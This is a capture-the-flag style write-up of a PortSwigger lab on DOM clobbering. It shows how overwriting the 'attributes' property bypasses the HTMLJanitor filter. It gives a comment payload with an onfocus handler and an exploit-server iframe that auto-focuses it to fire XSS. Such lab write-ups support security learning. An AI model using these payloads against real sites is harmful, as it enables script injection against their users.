# Clobbering DOM attributes to bypass HTML filters

## 📌 Lab Details
- **Title**: Clobbering DOM attributes to bypass HTML filters
- **Difficulty**: Expert
- **Category**: DOM-based vulnerability
- **Lab URL**: https://portswigger.net/academy/labs/launch/4d27a0ebb9fa4e9a66754f25ebbaca6772f085e601b714356dc4437a47e3efdc?referrer=%2fweb-security%2fdom-based%2fdom-clobbering%2flab-dom-clobbering-attributes-to-bypass-html-filters

## 🔍 Summary
This lab uses **HTMLJanitor**, which filters HTML attributes via `element.attributes`. By clobbering the `attributes` property using `<input id=attributes>`, we bypass the filter and inject an `onfocus=print()` on a form, triggering `print()` **automatically when focused using** `#x` **in the URL fragment**.

## 🛠 Steps to Solve
1. Go to one of the blog posts and create a comment containing the following HTML:
   ```sh
   <form id=x tabindex=0 onfocus=print()><input id=attributes>
   ```
2. Go to the exploit server and add the following `iframe` to the body:
   ```sh
   <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
   ```
3. Store the exploit and deliver it to the victim. The next time the page loads, the `print()` function is called.

## 📖 Key Takeaways
- **DOM Clobbering** can bypass attribute-based sanitization by overwriting `element.attributes`.
- The **iframe with** `#x` auto-focuses the form, triggering **XSS without user interaction**.
- Demonstrates why **using** `element.attributes` **for sanitization is unsafe**.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/2c496fbc-4094-462d-b3c7-e2b92e0e44ae)
![image](https://github.com/user-attachments/assets/fa87a2f2-a6d9-4b17-9e49-22e7fa6f0efc)
![image](https://github.com/user-attachments/assets/99b6834d-60df-4fdd-a977-de9ddfe957c8)
![image](https://github.com/user-attachments/assets/028090d1-b6a4-4fa3-8b39-0d4f7a57d2e3)
![image](https://github.com/user-attachments/assets/91772fae-dcd9-41fc-83ba-657a4d088173)
